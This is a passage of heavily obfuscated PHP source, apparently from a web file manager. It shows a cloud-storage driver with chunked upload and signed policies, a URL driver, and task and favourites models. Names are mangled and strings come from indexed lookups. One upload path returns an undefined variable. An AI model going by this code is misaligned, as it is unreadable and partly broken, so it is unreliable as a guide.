$this->fileInfo($³Ö»Ë€‡[$ œÎü†‹[32]], $ÉÉüø, $³Ö»Ë€‡); } return array($ œÎü†‹[85] => $‘Õ÷½Î, $ œÎü†‹[86] => $•Öª“Ü†); } public function has($óÏ¯Áì÷, $ö„™¯åñ = false, $îÔòßç = true) { $ëÜ³º‚· =& $_SERVER[ç¦¬”œš]; $§Ş‘çş = $ëÜ³º‚·[12]; $’‰•áÇ = 500; $ÇÍ…¹‚ö = 0; $óÎ¹á‘ = 0; $ºˆÓŸ‡Ò = rtrim($óÏ¯Áì÷, $ëÜ³º‚·[8]) . $ëÜ³º‚·[8]; while (!0) { check_abort(); $‚¿ğ ªè = $this->listObjs($óÏ¯Áì÷, $§Ş‘çş, $’‰•áÇ); if (!$‚¿ğ ªè) { return !1; } $§Ş‘çş = isset($‚¿ğ ªè[$ëÜ³º‚·[1574]]) ? $‚¿ğ ªè[$ëÜ³º‚·[1574]] : $ëÜ³º‚·[12]; $¹¼Àñ° = isset($‚¿ğ ªè[$ëÜ³º‚·[1575]]) ? $‚¿ğ ªè[$ëÜ³º‚·[1575]] : array(); if (empty($¹¼Àñ°)) { break; } $ØÎ“¥ş = array_filter($¹¼Àñ°, function ($ÄÀ¡öô¹) { $è¬ß‹­ç =& $_SERVER[ç¦¬”œš]; return $ÄÀ¡öô¹[$è¬ß‹­ç[33]] == $è¬ß‹­ç[78]; }); $¸öŸ—Âø = count($¹¼Àñ°); $ØÎ“¥ş = count($ØÎ“¥ş); $¥şğµÙê = $¸öŸ—Âø - $ØÎ“¥ş; if ($ö„™¯åñ) { $óÎ¹á‘ += $ØÎ“¥ş; $ÇÍ…¹‚ö += $¥şğµÙê; if ($¸öŸ—Âø < $’‰•áÇ) { break; } continue; } if ($îÔòßç) { if ($¥şğµÙê) { return !0; } } else { if ($ØÎ“¥ş) { return !0; } } if ($¸öŸ—Âø < $’‰•áÇ) { break; } } if ($ö„™¯åñ) { return array($ëÜ³º‚·[239] => $ÇÍ…¹‚ö, $ëÜ³º‚·[240] => $óÎ¹á‘); } return !1; } public function listAll($£†¨¡Ú¹) { $úãëÖˆŞ =& $_SERVER[ç¦¬”œš]; $†¥õíˆš = $ÏäÉ“ôä = array(); $this->fileList($£†¨¡Ú¹, $†¥õíˆš, $ÏäÉ“ôä, !0); $’ÍÇ™¾ı = array_to_keyvalue($ÏäÉ“ôä, $úãëÖˆŞ[32]); foreach ($†¥õíˆš as $±‡Æ‚û²) { if (is_string($±‡Æ‚û²)) { $’ÍÇ™¾ı[$±‡Æ‚û²] = array($úãëÖˆŞ[79] => 0); } } return $this->listAllFiles($£†¨¡Ú¹, $’ÍÇ™¾ı); } public function canRead($†ÀùÂ‹) { return $this->exist($†ÀùÂ‹) ? !0 : !1; } public function canWrite($ŠšÔ¦å˜) { return $this->exist($ŠšÔ¦å˜) ? !0 : !1; } public function getContent($¢ ¹„Àƒ) { return $this->fileSubstr($¢ ¹„Àƒ, 0, -1); } public function setContent($×ğ²¦, $ººü‡¹• = '') { $ø…Â£ƒÉ =& $_SERVER[ç¦¬”œš]; if (!$ººü‡¹•) { $´ÅÜÏ—† = $this->ussRequest($×ğ²¦, $ø…Â£ƒÉ[257]); return $´ÅÜÏ—†[$ø…Â£ƒÉ[1298]]; } $í¶®ÒÇó = $this->tempFile($this->pathThis($×ğ²¦)); file_put_contents($í¶®ÒÇó, $ººü‡¹•); if ($this->upload($×ğ²¦, $í¶®ÒÇó)) { $this->tempFileRemve($í¶®ÒÇó); return !0; } return !1; } public function fileSubstr($“™Ú”ÌÒ, $¦ÜÅÈã£, $ÕæíÀ’«) { $ÉëÑĞû­ =& $_SERVER[ç¦¬”œš]; if (!($…½§­Ïİ = $this->link($“™Ú”ÌÒ))) { return !1; } $ˆ×Ô¶Ø = !1; if ($ÕæíÀ’« > 0) { $•‡¥½¸© = $¦ÜÅÈã£ + $ÕæíÀ’« - 1; $ˆ×Ô¶Ø = array($ÉëÑĞû­[1535] . $¦ÜÅÈã£ . $ÉëÑĞû­[462] . $•‡¥½¸©); } $Úù²°äÏ = url_request($…½§­Ïİ, $ÉëÑĞû­[261], !1, $ˆ×Ô¶Ø); return $Úù²°äÏ[$ÉëÑĞû­[830]] ? $Úù²°äÏ[$ÉëÑĞû­[1288]] : !1; } public function upload($áÓÓÛ, $¨à§ø÷Ø, $»Ú¢µ³ = false, $¶ûÑï©Å = REPEAT_REPLACE) { $¥¬†û¿Ø =& $_SERVER[ç¦¬”œš]; $ä±±íÃğ = IO::size($¨à§ø÷Ø); if ($ä±±íÃğ <= 1024 * 1024 * 200) { $”äò–  = array($¥¬†û¿Ø[1577] . $¨à§ø÷Ø); $¡Œ™†·Î = $this->ussRequest($áÓÓÛ, $¥¬†û¿Ø[259], $”äò– ); return $¡Œ™†·Î[$¥¬†û¿Ø[1298]] ? $this->getPathOuter($áÓÓÛ) : !1; } $øÌ¡¡’ë = 1024 * 1024 * 10; $ôõõ£®¤ = array($¥¬†û¿Ø[1578], $¥¬†û¿Ø[1579] . $ä±±íÃğ, $¥¬†û¿Ø[1580], $¥¬†û¿Ø[1581] . $øÌ¡¡’ë); $¡Œ™†·Î = $this->ussRequest($áÓÓÛ, $¥¬†û¿Ø[259], !1, $ôõõ£®¤); if (!$¡Œ™†·Î[$¥¬†û¿Ø[1298]]) { return !1; } $¡ºœŸÉİ = $¡Œ™†·Î[$¥¬†û¿Ø[1288]]; $‹Ä¯Š› = 0; $ÖÜ–Ãó = $¡ºœŸÉİ[$¥¬†û¿Ø[1582]]; $‘µ—Õüæ = fopen($¨à§ø÷Ø, $¥¬†û¿Ø[1458]); if (!$‘µ—Õüæ) { return !1; } do { $®²ÂşŸì = $¡ºœŸÉİ[$¥¬†û¿Ø[1583]]; fseek_64($‘µ—Õüæ, $‹Ä¯Š›); $¦ğèÃğ = fread($‘µ—Õüæ, $®²ÂşŸì); $‚ëÄóÔ‹ = 0; do { $‚ëÄóÔ‹++; $¡ºœŸÉİ = $this->uploadPart($áÓÓÛ, $¡ºœŸÉİ, $¦ğèÃğ); } while (!$¡ºœŸÉİ && $‚ëÄóÔ‹ < 3); if (!$¡ºœŸÉİ) { return !1; } $ÖÜ–Ãó = $¡ºœŸÉİ[$¥¬†û¿Ø[1582]]; $‹Ä¯Š› += $®²ÂşŸì; } while ($ÖÜ–Ãó != -1); fclose($‘µ—Õüæ); $ôõõ£®¤ = array($¥¬†û¿Ø[1584], $¥¬†û¿Ø[1585] . $¡ºœŸÉİ[$¥¬†û¿Ø[1586]], $¥¬†û¿Ø[1580]); $¡Œ™†·Î = $this->ussRequest($áÓÓÛ, $¥¬†û¿Ø[259], !1, $ôõõ£®¤); return $¡Œ™†·Î[$¥¬†û¿Ø[1298]] ? $this->getPathOuter($«Ê¸¯¹·) : !1; } private function uploadPart($ı·ŞŒİı, $«·äóÜâ, &$ıÒ°„ËÔ) { $„ğ«ñ¿Ü =& $_SERVER[ç¦¬”œš]; $õóóÁÚá = array($„ğ«ñ¿Ü[1587], $„ğ«ñ¿Ü[1585] . $«·äóÜâ[$„ğ«ñ¿Ü[1586]], $„ğ«ñ¿Ü[1588] . $«·äóÜâ[$„ğ«ñ¿Ü[1582]], $„ğ«ñ¿Ü[146] . $«·äóÜâ[$„ğ«ñ¿Ü[1583]]); $ÃÙ°á‰º = $this->ussRequest($ı·ŞŒİı, $„ğ«ñ¿Ü[259], $ıÒ°„ËÔ, $õóóÁÚá); return !$ÃÙ°á‰º[$„ğ«ñ¿Ü[1298]] ? $ÃÙ°á‰º[$„ğ«ñ¿Ü[1298]] : $ÃÙ°á‰º[$„ğ«ñ¿Ü[1288]]; } public function uploadFormData($Ç£ó›Ìğ, $€©·­ù‘ = 3600) { return $this->uploadPolicy($Ç£ó›Ìğ, $€©·­ù‘); } public function multiUploadFormData($£ÃÚÊÖ, $°‹ô¬ó = 3600) { $Ï¦¤èšˆ =& $_SERVER[ç¦¬”œš]; $û¼Ö‚Å¾ = (int) $GLOBALS[$Ï¦¤èšˆ[7]][$Ï¦¤èšˆ[79]]; return $this->uploadPolicy($£ÃÚÊÖ, $°‹ô¬ó, $û¼Ö‚Å¾); } private function uploadPolicy($ğÕÑ‹€÷, $½·™Èõ‹ = 3600, $”«œáâä = 0) { $Â»«¢øÖ =& $_SERVER[ç¦¬”œš]; $Â”‚Ğ´ = $Â»«¢øÖ[8] . $this->bucket; $Š²÷ö´´ = gmdate($Â»«¢øÖ[1493]); $ò…Á‡ç¼ = array($Â»«¢øÖ[1589] => $this->bucket, $Â»«¢øÖ[1590] => $ğÕÑ‹€÷, $Â»«¢øÖ[1591] => time() + $½·™Èõ‹, $Â»«¢øÖ[1592] => $Š²÷ö´´); if ($”«œáâä) { $ò…Á‡ç¼[$Â»«¢øÖ[1478]] = $”«œáâä; } $æ ØÕÇš = base64_encode(json_encode($ò…Á‡ç¼)); $ì×ªí÷İ = base64_encode(hash_hmac($Â»«¢øÖ[1546], "\x50\x4f\123\x54\x26{$Â”‚Ğ´}\x26{$Š²÷ö´´}\x26{$æ ØÕÇš}", md5("{$this->userpass}"), !0)); $¤—¥á±š = array($Â»«¢øÖ[293] => $æ ØÕÇš, $Â»«¢øÖ[1593] => "\x55\x50\131\x55\x4e\40{$this->username}\72{$ì×ªí÷İ}", $Â»«¢øÖ[208] => $this->endpoint . $Â”‚Ğ´); return $¤—¥á±š; } public function download($­«ûùÑø, $©»ÒÉÈ) { $À¶ˆâúÉ = IO::getPathInner(IO::mkfile($©»ÒÉÈ)); if (!($¡¾¥²§ = $this->link($­«ûùÑø))) { return !1; } $ßø’Ï¢ä = 0; $¦›½‹Ñò = 1024 * 200; $ääâ™±¨ = fopen($À¶ˆâúÉ, $_SERVER[ç¦¬”œš][1541]); while (!0) { $‹İä©á = $this->fileSubstr($­«ûùÑø, $ßø’Ï¢ä, $¦›½‹Ñò); if ($‹İä©á === !1) { return !1; } fwrite($ääâ™±¨, $‹İä©á); $ßø’Ï¢ä += $¦›½‹Ñò; if (strlen($‹İä©á) < $¦›½‹Ñò) { break; } } fclose($ääâ™±¨); return $©»ÒÉÈ; } public function link($¶°Şª§, $°×‚Å = array()) { $ñÚÇâïÑ =& $_SERVER[ç¦¬”œš]; $¶°Şª§ = trim($¶°Şª§, $ñÚÇâïÑ[8]); if (!empty($this->token)) { $£õâÚ¹ğ = strtotime(date($ñÚÇâïÑ[1594])); $¥»ğÚÖŞ = substr(md5($this->token . $ñÚÇâïÑ[360] . $£õâÚ¹ğ . $ñÚÇâïÑ[1595] . $¶°Şª§), 12, 8) . $£õâÚ¹ğ; $°×‚Å[] = $ñÚÇâïÑ[1596] . $¥»ğÚÖŞ; } $æÏŸğó = !empty($°×‚Å) ? $ñÚÇâïÑ[76] . implode($ñÚÇâïÑ[360], $°×‚Å) : $ñÚÇâïÑ[12]; return $this->getHost() . $ñÚÇâïÑ[8] . $¶°Şª§ . $æÏŸğó; } public function fileOut($ºêã¦ñ, $ÈòøÍÀ¹ = false, $§¸ñ‡Òº = false, $‹—¾Óã¸ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ºêã¦ñ, $ÈòøÍÀ¹, $§¸ñ‡Òº, $‹—¾Óã¸); } if (!$§¸ñ‡Òº) { $§¸ñ‡Òº = $this->pathThis($ºêã¦ñ); } $äßü°·Ô = $ÈòøÍÀ¹ ? array($_SERVER[ç¦¬”œš][1597] . rawurlencode($§¸ñ‡Òº)) : array(); $‚«¦Œ®À = $this->link($ºêã¦ñ, $äßü°·Ô); $this->fileOutLink($‚«¦Œ®À); } public function fileOutServer($õÏÃÇ‚, $éµùÎ¡ = false, $à…İœî¹ = false, $›ÃóÈ€× = '') { parent::fileOut($õÏÃÇ‚, $éµùÎ¡, $à…İœî¹, $›ÃóÈ€×); } public function fileOutImage($±ß”Úù, $”´ûò¨Î = 250) { $ÏÂµéÂ¯ = $this->link($±ß”Úù . $_SERVER[ç¦¬”œš][1598] . $”´ûò¨Î); $this->fileOutLink($ÏÂµéÂ¯); } public function fileOutImageServer($â²¿ªÍ², $ìËªƒÑ = 250) { parent::fileOutImage($â²¿ªÍ², $ìËªƒÑ); } public function hashMd5($¾éÏ•ÊÆ) { $•ñû²êÍ =& $_SERVER[ç¦¬”œš]; $³‘ßúÅ¡ = $this->_objectMeta($¾éÏ•ÊÆ); return isset($³‘ßúÅ¡[$•ñû²êÍ[245]]) ? $³‘ßúÅ¡[$•ñû²êÍ[245]] : !1; } public function size($é¸¸‘õ¿) { $²ìËÌ  = $this->objectMeta($é¸¸‘õ¿); return $²ìËÌ  ? $²ìËÌ [$_SERVER[ç¦¬”œš][79]] : 0; } public function info($úİıÑ) { if ($this->isFolder($úİıÑ)) { return $this->folderInfo($úİıÑ); } else { if ($this->isFile($úİıÑ)) { return $this->fileInfo($úİıÑ); } } return !1; } public function exist($Š÷Ï™ÊÆ) { return $this->isFile($Š÷Ï™ÊÆ) || $this->isFolder($Š÷Ï™ÊÆ); } public function isFile($ÛÙ‡³ìö) { return !$this->isFolder($ÛÙ‡³ìö) && $this->objectMeta($ÛÙ‡³ìö); } public function isFolder($û†şÙéë) { return $this->cacheMethod($_SERVER[ç¦¬”œš][179], $û†şÙéë); } protected function objectMeta($ÍŠ…»ŠÈ) { return $this->cacheMethod($_SERVER[ç¦¬”œš][181], $ÍŠ…»ŠÈ); } protected function _objectMeta($›û¸É §) { $ê™±Æ ® =& $_SERVER[ç¦¬”œš]; if ($›û¸É § == $ê™±Æ ®[12] || $›û¸É § == $ê™±Æ ®[8]) { return array(); } $ÉÃ¥œ²ø = $this->ussRequest($›û¸É §, $ê™±Æ ®[1599]); if (!$ÉÃ¥œ²ø[$ê™±Æ ®[1298]]) { return null; } $ş÷ÎóÜø = isset($ÉÃ¥œ²ø[$ê™±Æ ®[1288]]) ? $ÉÃ¥œ²ø[$ê™±Æ ®[1288]] : array(); if (!isset($ş÷ÎóÜø[$ê™±Æ ®[1600]])) { return null; } $¥öÒÛ± = array($ê™±Æ ®[33] => isset($ş÷ÎóÜø[$ê™±Æ ®[1600]]) ? $ş÷ÎóÜø[$ê™±Æ ®[1600]] : null, $ê™±Æ ®[79] => isset($ş÷ÎóÜø[$ê™±Æ ®[1601]]) ? $ş÷ÎóÜø[$ê™±Æ ®[1601]] : null, $ê™±Æ ®[245] => isset($ş÷ÎóÜø[$ê™±Æ ®[1602]]) ? $ş÷ÎóÜø[$ê™±Æ ®[1602]] : null, $ê™±Æ ®[1569] => isset($ş÷ÎóÜø[$ê™±Æ ®[1603]]) ? $ş÷ÎóÜø[$ê™±Æ ®[1603]] : null); $¥öÒÛ±[$ê™±Æ ®[1570]] = isset($ş÷ÎóÜø[$ê™±Æ ®[1604]]) ? strtotime($ş÷ÎóÜø[$ê™±Æ ®[1604]]) : $¥öÒÛ±[$ê™±Æ ®[1569]]; return $¥öÒÛ±; } protected function _isFolder($ï¢’•ÃÚ) { $É¬¤Í¡À =& $_SERVER[ç¦¬”œš]; if ($ï¢’•ÃÚ == $É¬¤Í¡À[12] || $ï¢’•ÃÚ == $É¬¤Í¡À[8]) { return !0; } $üÌ£‡¯ú = $this->_objectMeta($ï¢’•ÃÚ); return isset($üÌ£‡¯ú[$É¬¤Í¡À[33]]) && $üÌ£‡¯ú[$É¬¤Í¡À[33]] == $É¬¤Í¡À[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($œóş¦ñŞ = false) { } public function exist($„Ğ”èÑØ) { $àËéµ¥ˆ = $this->info($„Ğ”èÑØ); return $àËéµ¥ˆ[$_SERVER[ç¦¬”œš][232]]; } public function isFile($–¤±¯½) { $Ó¨“¥È¨ = $this->info($–¤±¯½); return $Ó¨“¥È¨[$_SERVER[ç¦¬”œš][232]]; } public function isFolder($‡—ğ¿ıœ) { return !1; } public function size($—çğË±°) { $ÇÇ²èğŸ = $this->info($—çğË±°); return $ÇÇ²èğŸ[$_SERVER[ç¦¬”œš][79]]; } public function info($¦òÙº‘„) { return $this->infoParse($¦òÙº‘„); } public function infoAuth($ˆ–ÒÜôÄ) { return $this->infoParse($ˆ–ÒÜôÄ); } public function infoWithChildren($–áÅ‹¥Û) { return $this->infoParse($–áÅ‹¥Û); } public function infoFull($¬Û£Ë©³) { return $this->infoParse($¬Û£Ë©³); } private function infoParse($½‚š†îÈ) { $„ª«Ä¹ =& $_SERVER[ç¦¬”œš]; $éÛŞ©à = $this->header($½‚š†îÈ); if (!$éÛŞ©à || !$éÛŞ©à[$„ª«Ä¹[830]]) { return !1; } $£—¯ã™ = _get($éÛŞ©à, $„ª«Ä¹[413], 0); $°Ëœ÷íù = array($„ª«Ä¹[32] => $éÛŞ©à[$„ª«Ä¹[32]], $„ª«Ä¹[87] => $½‚š†îÈ, $„ª«Ä¹[33] => $„ª«Ä¹[230], $„ª«Ä¹[79] => intval($£—¯ã™), $„ª«Ä¹[169] => get_path_ext($éÛŞ©à[$„ª«Ä¹[32]]), $„ª«Ä¹[1455] => $£—¯ã™ > 0 && $éÛŞ©à[$„ª«Ä¹[1605]], $„ª«Ä¹[1456] => !1); return $°Ëœ÷íù; } private function header($‰¥Úæ §) { $­ÀÕ¢Ú =& $_SERVER[ç¦¬”œš]; if (isset(self::$_cacheHeader[$‰¥Úæ §])) { return self::$_cacheHeader[$‰¥Úæ §]; } $—ïİ¡ û = isset($GLOBALS[$­ÀÕ¢Ú[1606]]) ? $GLOBALS[$­ÀÕ¢Ú[1606]] : !1; $GLOBALS[$­ÀÕ¢Ú[1606]] = !0; self::$_cacheHeader[$‰¥Úæ §] = url_header($‰¥Úæ §); $GLOBALS[$­ÀÕ¢Ú[1606]] = $—ïİ¡ û; return self::$_cacheHeader[$‰¥Úæ §]; } public function hashSimple($ß²ú ±¿, $İóú™½Ê = false) { $ĞÇğ‹ø =& $_SERVER[ç¦¬”œš]; $¿’¡´° = $this->info($ß²ú ±¿); if (!$¿’¡´° || !$¿’¡´°[$ĞÇğ‹ø[232]]) { return !1; } $¼£Ø¹ö = $¿’¡´°[$ĞÇğ‹ø[79]]; $™ªÅİÌÏ = 200; $ùËûÀ«Ò = 50; if ($¼£Ø¹ö <= $™ªÅİÌÏ * $ùËûÀ«Ò) { return md5($this->fileSubstr($ß²ú ±¿, 0, $¼£Ø¹ö)) . $¼£Ø¹ö; } $¢¾ñ«”… = intval($¼£Ø¹ö / $ùËûÀ«Ò); $ôìŒíê = $ĞÇğ‹ø[12]; $•¾Ûó°Ä = timeFloat(); $‘Ñ´É‚‘ = 15; for ($«êì©ó€ = 0; $«êì©ó€ < $ùËûÀ«Ò; $«êì©ó€++) { if (timeFloat() - $•¾Ûó°Ä > $‘Ñ´É‚‘) { return !1; } $ÂÌ» •ì = $this->fileSubstr($ß²ú ±¿, $¢¾ñ«”… * $«êì©ó€, $™ªÅİÌÏ); if (!$ÂÌ» •ì) { return !1; } $ôìŒíê .= $ÂÌ» •ì; } $ôìŒíê .= $this->fileSubstr($ß²ú ±¿, $¼£Ø¹ö - $™ªÅİÌÏ, $™ªÅİÌÏ); return md5($ôìŒíê) . $¼£Ø¹ö; } public function getContent($ÅÂ²‹À») { return $this->fileSubstr($ÅÂ²‹À»); } public function fileSubstr($õ¾¶Òí·, $ĞÍÂœòû = 0, $°¡ã°È´ = -1) { $¶¾Şû°¯ =& $_SERVER[ç¦¬”œš]; $ú¥¬¥ÆÄ = $this->info($õ¾¶Òí·); if (!$ú¥¬¥ÆÄ || !$ú¥¬¥ÆÄ[$¶¾Şû°¯[232]] && $ú¥¬¥ÆÄ[$¶¾Şû°¯[79]] > 1024 * 1024 * 10) { return !1; } if ($°¡ã°È´ === -1) { $°¡ã°È´ = $ú¥¬¥ÆÄ[$¶¾Şû°¯[79]]; } if ($°¡ã°È´ == 0) { return $¶¾Şû°¯[12]; } $Ëš¥êÑà = array($¶¾Şû°¯[1607] . $ĞÍÂœòû . $¶¾Şû°¯[865] . ($ĞÍÂœòû + $°¡ã°È´ - 1)); $¬î¡¦û¢ = url_request($õ¾¶Òí·, $¶¾Şû°¯[261], !1, $Ëš¥êÑà, !1, !1, 30); return $¬î¡¦û¢[$¶¾Şû°¯[1288]] ? $¬î¡¦û¢[$¶¾Şû°¯[1288]] : $¶¾Şû°¯[12]; } public function download($éÂŒ¼ıÖ, $°º¢¨­¼) { Downloader::start($éÂŒ¼ıÖ, $°º¢¨­¼); return $°º¢¨­¼; } } goto béáÇ—¦ˆÕ; eµ–”İ…ë: class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\145\x6d\56\164\141\163\x6b\x4c\151\163\x74"; public $field = array("\x6e\x61\x6d\145", "\164\x79\x70\x65", "\x65\166\x65\x6e\x74", "\164\x69\155\145", "\144\145\x73\x63", "\163\x79\163\164\145\x6d", "\x65\x6e\141\x62\x6c\145", "\154\141\x73\164\122\165\156", "\163\x6f\x72\x74"); public function listData($— üÏåÓ = false, $ò§Úí = "\163\x6f\162\x74", $ØÜÆèÖÃ = false) { return parent::listData($— üÏåÓ, $ò§Úí, $ØÜÆèÖÃ); } public function add($‰ù‹Ï­) { $›¨şÃ =& $_SERVER[ç¦¬”œš]; $´º€­ÁÈ = $this->findByName($‰ù‹Ï­[$›¨şÃ[32]]); if ($´º€­ÁÈ) { return !1; } $‰ù‹Ï­[$›¨şÃ[1721]] = 0; $‰ù‹Ï­[$›¨şÃ[1993]] = $this->getSort(); return parent::insert($‰ù‹Ï­); } private function getSort() { $•±š¢°Ë =& $_SERVER[ç¦¬”œš]; $­ıüùº = parent::listData(); $ïÑ»²Ç = array_to_keyvalue($­ıüùº, $•±š¢°Ë[12], $•±š¢°Ë[1993]); return empty($ïÑ»²Ç) ? 0 : max($ïÑ»²Ç) + 1; } public function update($áÍÖ‚„€, $‘ºñ“·) { $Ã®›ßÏì =& $_SERVER[ç¦¬”œš]; $ùïˆ˜˜Œ = $this->listData($áÍÖ‚„€); $å…²â‰Û = $this->findByName($‘ºñ“·[$Ã®›ßÏì[32]]); if (!$ùïˆ˜˜Œ || $å…²â‰Û && $å…²â‰Û[$Ã®›ßÏì[484]] != $ùïˆ˜˜Œ[$Ã®›ßÏì[484]]) { return !1; } return parent::update($áÍÖ‚„€, $‘ºñ“·); } public function remove($¦¤¹òË, $½“€½î¢ = false) { $Ê’õüÃ“ =& $_SERVER[ç¦¬”œš]; $å¼ô÷˜ø = $this->listData($¦¤¹òË); if (!$å¼ô÷˜ø) { return; } if (!$½“€½î¢ && $å¼ô÷˜ø[$Ê’õüÃ“[191]] == $Ê’õüÃ“[91]) { return !1; } return parent::remove($¦¤¹òË); } public function enable($å’üä­, $Ÿ¦¡•áú) { return $this->update($å’üä­, array($_SERVER[ç¦¬”œš][2433] => $Ÿ¦¡•áú)); } public function run($¡ÖÍûş) { return $this->update($¡ÖÍûş, array($_SERVER[ç¦¬”œš][2445] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\137\x66\141\166"; protected function cacheFunctionAlias($«ºŸš»ı) { $†š =& $_SERVER[ç¦¬”œš]; return array($†š[2084] => array(USER_ID, $†š[2446])); } protected function listData() { $Åè„‘ˆº =& $_SERVER[ç¦¬”œš]; $øèû¬Æş = array($Åè„‘ˆº[1761] => USER_ID, $Åè„‘ˆº[566] => 0); $•õ¦¾Ëš = $Åè„‘ˆº[2447]; $õô–ÈÃÆ = $this->field($•õ¦¾Ëš)->where($øèû¬Æş)->order($Åè„‘ˆº[2448])->select(); return $õô–ÈÃÆ ? $õô–ÈÃÆ : array(); } protected function resetCache() { } protected function listView() { $èß‚Å²¦ =& $_SERVER[ç¦¬”œš]; $ÒâÜ Ââ = $this->listData(); $È”Ò´£Â = array_filter_by_field($ÒâÜ Ââ, $èß‚Å²¦[33], $èß‚Å²¦[499]); $¥Œ®ùÃ = array_to_keyvalue($È”Ò´£Â, $èß‚Å²¦[12], $èß‚Å²¦[87]); if (!$¥Œ®ùÃ) { return $ÒâÜ Ââ; } $—³Îùğ‚ = 2000; $¼„‰ìíƒ = array($èß‚Å²¦[500] => array($èß‚Å²¦[501], $¥Œ®ùÃ)); $éı¢ö·¡ = Model($èß‚Å²¦[904])->listSource($¼„‰ìíƒ, $—³Îùğ‚); $éı¢ö·¡ = array_merge($éı¢ö·¡[$èß‚Å²¦[86]], $éı¢ö·¡[$èß‚Å²¦[85]]); $éı¢ö·¡ = array_to_keyvalue($éı¢ö·¡, $èß‚Å²¦[193]); foreach ($ÒâÜ Ââ as $ÜõƒŸ²è => $ÕµŞ°“…) { $ÆÍè¥ñ = $éı¢ö·¡[$ÕµŞ°“…[$èß‚Å²¦[87]]]; $ÆÍè¥ñ = $ÆÍè¥ñ ? $ÆÍè¥ñ : array(); $ÒâÜ Ââ[$ÜõƒŸ²è] = array_merge($ÆÍè¥ñ, $ÕµŞ°“…); } return $ÒâÜ Ââ; } protected function addFav($¼ó€ëÆ¶, $Ş­´š = '', $È£æü  = "\163\x6f\x75\x72\x63\x65") { $¤ß¿ìèú =& $_SERVER[ç¦¬”œš]; $ÁŸŠìÙ = array($¤ß¿ìèú[1761] => USER_ID, $¤ß¿ìèú[566] => 0, $¤ß¿ìèú[505] => $È£æü , $¤ß¿ìèú[504] => $¼ó€ëÆ¶); if ($this->where($ÁŸŠìÙ)->find()) { return !1; } $ÁŸŠìÙ = array($¤ß¿ìèú[1761] => USER_ID, $¤ß¿ìèú[566] => 0); $‡Ë»ÔÖ‚ = $this->where($ÁŸŠìÙ)->max($¤ß¿ìèú[1993]); if (!$‡Ë»ÔÖ‚) { $‡Ë»ÔÖ‚ = 0; } if (!$Ş­´š && $È£æü  == $¤ß¿ìèú[499]) { $èîüøœ = Model($¤ß¿ìèú[1419])->where(array($¤ß¿ìèú[500] => $¼ó€ëÆ¶))->find(); if (!$èîüøœ) { return !1; } $Ş­´š = $èîüøœ[$¤ß¿ìèú[32]]; } $Ş­´š = $this->getAutoName($Ş­´š); $¿ˆÛ™—† = array($¤ß¿ìèú[1761] => USER_ID, $¤ß¿ìèú[566] => 0, $¤ß¿ìèú[503] => $Ş­´š, $¤ß¿ìèú[504] => $¼ó€ëÆ¶, $¤ß¿ìèú[505] => $È£æü , $¤ß¿ìèú[1973] => $‡Ë»ÔÖ‚ + 1); return $this->add($¿ˆÛ™—†); } protected function remove($ûŒƒº°Ü) { $ûÀìòÒ• =& $_SERVER[ç¦¬”œš]; $¨œòŒ‚Ê = array($ûÀìòÒ•[1761] => USER_ID, $ûÀìòÒ•[502] => $ûŒƒº°Ü); return $this->where($¨œòŒ‚Ê)->delete(); } protected function removeByName($İ£µüÉ) { $²ªõßóÆ =& $_SERVER[ç¦¬”œš]; $ÔÏˆïí = array($²ªõßóÆ[1761] => USER_ID, $²ªõßóÆ[503] => $İ£µüÉ, $²ªõßóÆ[566] => 0); return $this->where($ÔÏˆïí)->delete(); } protected function rename($ÙÜÏæ»¦, $Üê„üé) { $¸í·—¢ =& $_SERVER[ç¦¬”œš]; if ($ÙÜÏæ»¦ == $Üê„üé) { return !1; } $÷±º¦˜Ğ = $this->getAutoName($Üê„üé); if ($Üê„üé != $÷±º¦˜Ğ) { return !1; } $ßÏâ¨Ğ = array($¸í·—¢[1761] => USER_ID, $¸í·—¢[566] => 0, $¸í·—¢[32] => $ÙÜÏæ»¦); return $this->where($ßÏâ¨Ğ)->save(array($¸í·—¢[32] => $Üê„üé)); } protected function resetSort($›»´±) { $ñêÊ÷µè =& $_SERVER[ç¦¬”œš]; $›»´± = is_array($›»´±) ? $›»´± : array(); $¾¥åù = array($ñêÊ÷µè[1761] => USER_ID); for ($Ö‰¿Í÷ = 0; $Ö‰¿Í÷ < count($›»´±); $Ö‰¿Í÷++) { $¾¥åù[$ñêÊ÷µè[502]] = $›»´±[$Ö‰¿Í÷]; $this->where($¾¥åù)->save(array($ñêÊ÷µè[1973] => $Ö‰¿Í÷ + 1)); } return !0; } protected function moveTop($ª§Æ¦Í—) { $…Èõ¹¯… =& $_SERVER[ç¦¬”œš]; $ßò¯â§ = array($…Èõ¹¯…[1761] => USER_ID, $…Èõ¹¯…[566] => 0); $ö…Ç¿°ï = $this->where($ßò¯â§)->where(array($…Èõ¹¯…[32] => $ª§Æ¦Í—))->find(); if (!$ö…Ç¿°ï) { return; } $ôÈ…Ñ§Ô = $this->field($…Èõ¹¯…[484])->where($ßò¯â§)->order($…Èõ¹¯…[2448])->select(); $ôÈ…Ñ§Ô = array_to_keyvalue($ôÈ…Ñ§Ô, $…Èõ¹¯…[12], $…Èõ¹¯…[484]); $åÂ÷ü³ = $ôÈ…Ñ§Ô; $ôÈ…Ñ§Ô = array_remove_value($ôÈ…Ñ§Ô, $ö…Ç¿°ï[$…Èõ¹¯…[484]]); array_unshift($ôÈ…Ñ§Ô, $ö…Ç¿°ï[$…Èõ¹¯…[484]]); return $this->resetSort($ôÈ…Ñ§Ô); } protected function moveBottom($á‡ÕÔã‚) { $ñ·ÊÌîí =& $_SERVER[ç¦¬”œš]; $µ¿¬¡ƒÄ = array($ñ·ÊÌîí[1761] => USER_ID, $ñ·ÊÌîí[566] => 0); $Ş‚´šÊ = $this->where($µ¿¬¡ƒÄ)->max($ñ·ÊÌîí[1993]); $¢ıóÖ¹¬ = array($ñ·ÊÌîí[1993] => $Ş‚´šÊ + 1); return $this->where($µ¿¬¡ƒÄ)->where(array($ñ·ÊÌîí[32] => $á‡ÕÔã‚))->save($¢ıóÖ¹¬); } private function getAutoName($Ìµõ§) { $øÀ£·×ı =& $_SERVER[ç¦¬”œš]; $Õ‚ÇşÃ = array($øÀ£·×ı[1761] => USER_ID, $øÀ£·×ı[566] => 0); $÷Æ“¤Â = $this->field($øÀ£·×ı[32])->where($Õ‚ÇşÃ)->select(); $÷Æ“¤Â = 